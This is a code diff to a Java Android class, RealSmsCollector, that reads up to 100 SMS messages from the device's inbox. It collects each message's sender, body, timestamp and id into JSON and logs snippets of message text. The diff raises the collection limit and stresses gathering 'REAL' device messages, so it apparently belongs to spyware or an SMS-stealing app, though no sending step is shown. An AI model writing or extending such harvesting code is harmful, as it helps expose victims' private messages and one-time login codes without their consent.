@@ -20,41 +20,52 @@ public class RealSmsCollector {
         Cursor cursor = null;
         
         try {
-            Log.d(TAG, "📨 Collecting real SMS messages...");
+            Log.d(TAG, "📨 Collecting REAL SMS messages from device...");
             
             Uri uri = Uri.parse("content://sms");
             String[] projection = new String[]{
                 "_id", "address", "body", "date", "type"
             };
             
-            cursor = context.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 50");
+            cursor = context.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 100");
             
             if (cursor != null && cursor.moveToFirst()) {
+                int count = 0;
                 do {
-                    JSONObject sms = new JSONObject();
                     String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                     String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                     long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                     int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                     
-                    sms.put("sender", address != null ? address : "Unknown");
-                    sms.put("message", body != null ? body : "");
-                    sms.put("timestamp", date);
-                    sms.put("type", getSmsType(type));
-                    sms.put("readable_date", new java.util.Date(date).toString());
-                    
-                    smsList.put(sms);
-                    Log.d(TAG, "📱 SMS: " + address + " - " + (body != null ? body.substring(0, Math.min(30, body.length())) : ""));
+                    // Only add real SMS data
+                    if (address != null && body != null) {
+                        JSONObject sms = new JSONObject();
+                        sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
+                        sms.put("sender", address);
+                        sms.put("message", body);
+                        sms.put("timestamp", date);
+                        sms.put("type", getSmsType(type));
+                        sms.put("readable_date", new java.util.Date(date).toString());
+                        
+                        smsList.put(sms);
+                        count++;
+                        
+                        if (count <= 5) {
+                            Log.d(TAG, "📱 REAL SMS: " + address + " - " + body.substring(0, Math.min(30, body.length())));
+                        }
+                    }
                     
                 } while (cursor.moveToNext());
+                
+                Log.d(TAG, "✅ Collected " + count + " REAL SMS messages from device");
+            } else {
+                Log.w(TAG, "📭 No REAL SMS messages found in device");
             }
             
-            Log.d(TAG, "✅ Collected " + smsList.length() + " real SMS messages");
-            
         } catch (SecurityException e) {
-            Log.e(TAG, "❌ SMS permission denied: " + e.getMessage());
+            Log.e(TAG, "❌ SMS permission denied - NO SMS DATA COLLECTED: " + e.getMessage());
         } catch (Exception e) {
-            Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
+            Log.e(TAG, "❌ Error reading REAL SMS: " + e.getMessage());
         } finally {
             if (cursor != null) {
                 cursor.close();
